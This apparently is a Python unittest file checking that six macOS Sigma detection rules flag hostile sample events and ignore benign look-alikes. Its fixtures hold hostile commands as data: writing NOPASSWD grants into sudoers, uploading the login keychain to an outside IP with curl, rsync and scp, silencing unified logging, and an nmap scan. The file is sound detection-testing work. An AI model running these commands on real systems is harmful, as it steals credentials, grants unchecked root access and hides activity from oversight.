"""macOS Sigma pack: each example loads, matches a hostile event, and ignores a benign look-alike."""

import unittest
from pathlib import Path

from watchpost import rules as rules_mod
from watchpost import sigma

PACK = Path(__file__).resolve().parent.parent / "docs" / "sigma-examples" / "macos"

CASES = [
    {
        "file": "sudoers_nopasswd.yml",
        "rule_id": "sigma_macos_sudoers_nopasswd_grant",
        "technique": "T1548.003",
        "severity": "high",
        "category": "process_creation",
        "malicious": [
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "message": "sh -c echo 'alice ALL=(ALL) NOPASSWD: ALL' >> /private/etc/sudoers"},
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "message": "/bin/sh -c 'printf %s \"alice ALL=(ALL) NOPASSWD: ALL\" > /etc/sudoers.d/alice'"},
        ],
        "benign": [
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "message": "/usr/sbin/visudo -c -f /etc/sudoers"},
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "message": "echo 'alice ALL=(ALL) NOPASSWD: ALL' >> /tmp/notes.txt"},
        ],
    },
    {
        "file": "external_login_local_admin.yml",
        "rule_id": "sigma_macos_external_login_as_local_admin",
        "technique": "T1078.003",
        "severity": "high",
        "category": "authentication",
        "malicious": [
            {"event_type": "auth_success", "user": "root", "src_ip": "203.0.113.10",
             "host": "macbook-pro.local",
             "message": "sshd[100]: Accepted password for root from 203.0.113.10 port 22 ssh2"},
            {"event_type": "auth_success", "user": "admin", "src_ip": "198.51.100.8",
             "host": "macbook-pro.local",
             "message": "screensharingd[210]: Authentication: SUCCEEDED :: User Name: admin"},
        ],
        "benign": [
            {"event_type": "auth_success", "user": "admin", "src_ip": "10.1.2.3",
             "host": "macbook-pro.local",
             "message": "sshd[100]: Accepted password for admin from 10.1.2.3 port 22 ssh2"},
            {"event_type": "auth_success", "user": "alice", "src_ip": "203.0.113.10",
             "host": "macbook-pro.local",
             "message": "sshd[100]: Accepted password for alice from 203.0.113.10 port 22 ssh2"},
            {"event_type": "auth_failure", "user": "root", "src_ip": "203.0.113.10",
             "host": "macbook-pro.local",
             "message": "sshd[100]: Failed password for root from 203.0.113.10 port 22 ssh2"},
        ],
    },
    {
        "file": "external_password_guessing.yml",
        "rule_id": "sigma_macos_external_password_guessing",
        "technique": "T1110.001",
        "severity": "high",
        "category": "authentication",
        "malicious": [
            {"event_type": "auth_failure", "user": "root", "src_ip": "203.0.113.10",
             "host": "macbook-pro.local",
             "message": "sshd[4821]: Failed password for root from 203.0.113.10 port 51422 ssh2"},
            {"event_type": "auth_failure", "user": "admin", "src_ip": "198.51.100.8",
             "host": "macbook-pro.local",
             "message": "screensharingd[210]: Authentication: FAILED :: User Name: admin"},
            {"event_type": "auth_failure", "user": "root", "src_ip": "203.0.113.10",
             "host": "macbook-pro.local",
             "message": "sshd[4821]: error: PAM: authentication error for root from 203.0.113.10"},
        ],
        "benign": [
            {"event_type": "auth_failure", "user": "root", "src_ip": "10.1.2.3",
             "host": "macbook-pro.local",
             "message": "sshd[4821]: Failed password for root from 10.1.2.3 port 51422 ssh2"},
            {"event_type": "auth_failure", "user": "alice", "src_ip": "203.0.113.10",
             "host": "macbook-pro.local",
             "message": "sshd[4821]: Failed password for alice from 203.0.113.10 port 51422 ssh2"},
            {"event_type": "auth_failure", "user": "root", "src_ip": "203.0.113.10",
             "host": "macbook-pro.local",
             "message": "sshd[9]: Connection closed by authenticating user root 203.0.113.10 port 22"},
            {"event_type": "auth_success", "user": "root", "src_ip": "203.0.113.10",
             "host": "macbook-pro.local",
             "message": "sshd[100]: Accepted password for root from 203.0.113.10 port 22 ssh2"},
        ],
    },
    {
        "file": "network_service_discovery.yml",
        "rule_id": "sigma_macos_network_service_discovery",
        "technique": "T1046",
        "severity": "medium",
        "category": "process_creation",
        "malicious": [
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "message": "/usr/bin/dns-sd -B _ssh._tcp local."},
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "message": "/usr/bin/dns-sd -B _rfb._tcp"},
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "message": "/usr/local/bin/nmap -sS -p 22,5900 192.168.1.0/24"},
        ],
        "benign": [
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "message": "/usr/bin/dns-sd -B _airplay._tcp local."},
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "message": "/usr/bin/man nmap"},
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "message": "/sbin/ping -c 3 10.0.0.1"},
        ],
    },
    {
        "file": "keychain_upload.yml",
        "rule_id": "sigma_macos_keychain_upload_to_external_host",
        "technique": "T1048",
        "severity": "critical",
        "category": "process_creation",
        "malicious": [
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "dest_ip": "203.0.113.50",
             "message": "/usr/bin/curl -T /Users/alice/Library/Keychains/login.keychain-db https://203.0.113.50/up"},
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "dest_ip": "203.0.113.50",
             "message": "/bin/bash -c curl -T /Users/alice/Library/Keychains/login.keychain http://203.0.113.50/"},
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "dest_ip": "203.0.113.50",
             "message": "/usr/bin/rsync -a /Users/alice/Library/Keychains/login.keychain-db rsync://203.0.113.50/exfil/"},
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "dest_ip": "203.0.113.50",
             "message": "/usr/bin/scp /Users/alice/Library/Keychains/login.keychain-db alice@203.0.113.50:/tmp/"},
        ],
        "benign": [
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "dest_ip": "10.1.2.3",
             "message": "/usr/bin/curl -T /Users/alice/Library/Keychains/login.keychain-db https://10.1.2.3/backup"},
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "dest_ip": "203.0.113.50",
             "message": "/usr/bin/curl https://203.0.113.50/index.html"},
            {"event_type": "process_start", "user": "alice", "host": "macbook-pro.local",
             "message": "/usr/bin/curl -T /Users/alice/Library/Keychains/login.keychain-db https://files.example/up"},
        ],
    },
    {
        "file": "unified_logging_disabled.yml",
        "rule_id": "sigma_macos_unified_logging_disabled",
        "technique": "T1562.006",
        "severity": "high",
        "category": "process_creation",
        "malicious": [
            {"event_type": "process_start", "user": "root", "host": "macbook-pro.local",
             "message": '/usr/bin/log config --mode "level:off" --subsystem com.apple.authd'},
        ],
        "benign": [
            {"event_type": "process_start", "user": "root", "host": "macbook-pro.local",
             "message": '/usr/bin/log config --mode "level:info"'},
            {"event_type": "process_start", "user": "root", "host": "macbook-pro.local",
             "message": "/usr/bin/log config --status"},
            {"event_type": "process_start", "user": "root", "host": "macbook-pro.local",
             "message": "/usr/bin/log show --style syslog --last 5m"},
        ],
    },
]


class MacosSigmaPackTests(unittest.TestCase):
    def test_pack_is_these_six_rules(self):
        found = sorted(p.name for p in PACK.glob("*.yml"))
        self.assertEqual(found, sorted(case["file"] for case in CASES))
        self.assertEqual(len(CASES), 6)

    def test_each_rule_loads_matches_and_ignores_benign(self):
        for case in CASES:
            with self.subTest(rule=case["file"]):
                compiled = sigma.compile_rule((PACK / case["file"]).read_text())
                self.assertEqual(compiled["rule_id"], case["rule_id"])
                self.assertNotIn(compiled["rule_id"], rules_mod.RULE_FUNCTIONS)
                self.assertEqual([t["id"] for t in compiled["techniques"]], [case["technique"]])
                self.assertEqual(compiled["severity"], case["severity"])
                self.assertEqual(compiled["logsource"].get("product"), "macos")
                self.assertEqual(compiled["logsource"].get("category"), case["category"])
                self.assertEqual(
                    rules_mod.validate_params(compiled["rule_id"], compiled["params"]),
                    compiled["params"])
                for event in case["malicious"]:
                    self.assertTrue(sigma.matches(compiled["params"], event), event["message"])
                for event in case["benign"]:
                    self.assertFalse(sigma.matches(compiled["params"], event), event["message"])
